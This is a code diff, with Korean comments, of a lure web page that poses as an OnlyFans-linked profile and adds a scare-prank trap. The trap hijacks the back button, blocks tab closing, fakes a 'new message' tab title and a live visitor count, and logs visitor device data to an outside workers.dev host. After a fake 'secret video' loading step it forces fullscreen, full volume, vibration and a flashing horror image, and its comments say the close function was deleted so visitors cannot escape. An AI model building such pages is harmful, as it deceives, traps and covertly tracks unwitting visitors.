@@ -10,6 +10,7 @@
     <meta property="og:url" content="https://onlyfans.com/">
     <link rel="icon" href="https://img.icons8.com/fluency/48/user-female-circle.png" type="image/x-icon">
     <link rel="preload" href="maltese.jpg" as="image">
+    
     <style>
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f3f4f6; color: #1f2937; min-height: 100vh; }
         #site-logo { position: absolute; top: 20px; left: 20px; max-width: 150px; height: auto; z-index: 10; }
@@ -48,20 +49,22 @@
         .stat-value { font-size: 24px; font-weight: bold; color: #111827; }
         .stat-label { font-size: 14px; color: #6b7280; margin-top: 5px; }
 
+        /* 💡 100dvh 폴백(Fallback) */
         #prank-zone { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; height: 100dvh; z-index: 9999; background-color: black; text-align: center; }
         
-        /* 💡 드래그 방지 및 모바일 터치 팝업 차단 */
+        /* 💡 드래그 방지 및 모바일 터치 팝업 완벽 차단 */
         #maltese-img { 
             width: 100%; height: 100%; object-fit: contain; 
             -webkit-user-select: none; 
             user-select: none; 
             -webkit-touch-callout: none; 
-            pointer-events: none; /* 클릭 이벤트 자체가 통과되도록 하여 완전 방어 */
+            pointer-events: none; 
         }
         
         .prank-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #ef4444; font-size: 50px; font-weight: 900; text-align: center; width: 100%; text-shadow: 3px 3px 10px rgba(0,0,0,0.9); pointer-events: none; }
         #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9998; }
 
+        /* 💡 지진 및 점멸 애니메이션 */
         @keyframes shake {
             0% { transform: translate(2px, 1px) rotate(0deg); }
             10% { transform: translate(-1px, -2px) rotate(-1deg); }
@@ -83,13 +86,14 @@
 
         .horror-active #maltese-img {
             animation: shake 0.15s infinite; 
-            will-change: transform; /* 💡 GPU 가속 적용 */
+            will-change: transform; /* 💡 GPU 가속 적용으로 60FPS 방어 */
         }
         .horror-active #prank-zone {
             animation: flash 0.1s infinite; 
         }
     </style>
 </head>
+
 <body oncontextmenu="return false;">
 
     <img id="site-logo" src="logo.png" alt="사이트 로고">
@@ -135,13 +139,37 @@
     </div>
 
     <script>
-        // 💡 [2번 기능] 뒤로 가기 함정 (History API)
+        // ==========================================
+        // 🔒 1. 갇힘(Trap) 시스템 발동 로직
+        // ==========================================
+        
+        // [Trap A] 뒤로 가기 함정 (History API)
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1); // 다시 원래 자리로 밀어넣음
             if (!isPrankActive) triggerPrank(); // 뒤로 가기 누르면 낚시 즉시 발동
         };
 
+        // [Trap B] 인앱 브라우저 및 탭 종료 방지 (경고창 띄우기)
+        window.addEventListener('beforeunload', function (e) {
+            if (!isPrankActive && !hasSeenPicture) {
+                e.preventDefault();
+                e.returnValue = ''; // 최신 브라우저 규격 강제 이탈 경고
+            }
+        });
+
+        // [Trap C] 탭 이탈 시 제목 변경 (돌아오게 만들기)
+        document.addEventListener("visibilitychange", () => {
+            if (document.hidden) {
+                document.title = "💬 새로운 메시지가 도착했습니다"; 
+            } else {
+                document.title = "HanJiyu07 | Profile & Stats";
+            }
+        });
+
+        // ==========================================
+        // 📈 2. 실시간 방문자 페이크 로직
+        // ==========================================
         const countEl = document.getElementById('visitor-count');
         let currentCount = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
         countEl.innerText = currentCount;
@@ -153,6 +181,9 @@
             countEl.innerText = currentCount;
         }, 4000);
 
+        // ==========================================
+        // 📡 3. 서버리스 백엔드 통신 및 기기 정보 수집
+        // ==========================================
         const WORKER_URL = "https://flat-night-2b27.chldudwo2158.workers.dev"; 
         const startTime = new Date();
         let isPrankActive = false;
@@ -193,6 +224,9 @@
             logToBackend("entry");
         }
 
+        // ==========================================
+        // 🎭 4. 지옥문 오픈 (Prank 발동 로직)
+        // ==========================================
         const prankBtns = document.querySelectorAll('.js-prank-btn');
         const prankZone = document.getElementById('prank-zone');
         const overlay = document.getElementById('overlay');
@@ -202,9 +236,13 @@
             if (isPrankActive) return;
             isPrankActive = true;
 
+            // 시각 효과(지진/점멸) 활성화
             document.body.classList.add('horror-active');
+            
+            // 소리 최대화 (시스템 볼륨 내 100%)
             audio.volume = 1.0; 
 
+            // 전체화면 강제 시도 (에러 무시)
             const docEl = document.documentElement;
             if (docEl.requestFullscreen) {
                 docEl.requestFullscreen().catch(err => {
@@ -212,43 +250,58 @@
                 });
             }
 
+            // 기기 진동 (심장 박동 패턴)
             if ('vibrate' in navigator) {
                 navigator.vibrate([100, 50, 100, 50, 800, 100, 1000]); 
             }
 
+            // 백엔드로 성공 로그 전송 (최초 1회만)
             if (!hasSeenPicture) {
                 hasSeenPicture = true;
                 logToBackend("success");
             }
 
+            // 귀신 및 소리 출력
             overlay.style.display = 'block';
             prankZone.style.display = 'block';
             audio.play().catch(e => console.log("오디오 자동 재생 차단됨"));
 
+            // 버튼 텍스트 변경
             prankBtns.forEach(btn => {
                 btn.innerText = "귀신이 튀어나왔습니다!";
                 btn.style.animation = "none";
             });
+            
+            // 배경 스크롤 차단
             document.body.style.overflow = 'hidden';
         }
 
+        // 🟢 [루트 A] 버튼 클릭 시 가짜 로딩 후 발동 (몰입감 극대화)
         prankBtns.forEach(btn => {
             btn.addEventListener('click', function(e) { 
                 e.stopPropagation(); 
-                triggerPrank(); 
+                
+                // 가짜 로딩 텍스트
+                this.innerText = "🎥 시크릿 영상 연결 중...";
+                this.style.opacity = "0.7";
+                
+                // 0.8초 딜레이 후 발동
+                setTimeout(() => { triggerPrank(); }, 800);
             });
         });
 
+        // 🟢 [루트 B] 빈 화면 터치 시 즉시 발동
         document.body.addEventListener('click', function(e) {
             if (e.target !== overlay && e.target !== prankZone && e.target !== document.getElementById('maltese-img')) {
                 triggerPrank();
             }
         });
 
-        setTimeout(() => { triggerPrank(); }, 7800); 
+        // 🟢 [루트 C] 7.5초 동안 아무 클릭이 없을 시 자동 발동
+        setTimeout(() => { triggerPrank(); }, 7500); 
 
-        // 💡 닫기(closePrank) 함수 및 클릭 이벤트 리스너를 완전히 삭제했습니다!
-        // 이제 탭을 강제로 끄지 않는 이상 귀신 화면에서 절대 빠져나갈 수 없습니다.
+        // 💡 주의: 귀신을 끄는 closePrank 함수를 영구 삭제했습니다! 
+        // 이제 탭을 끄지 않는 이상 이 화면에서 절대 벗어날 수 없습니다.
     </script>
 </body>
 </html>
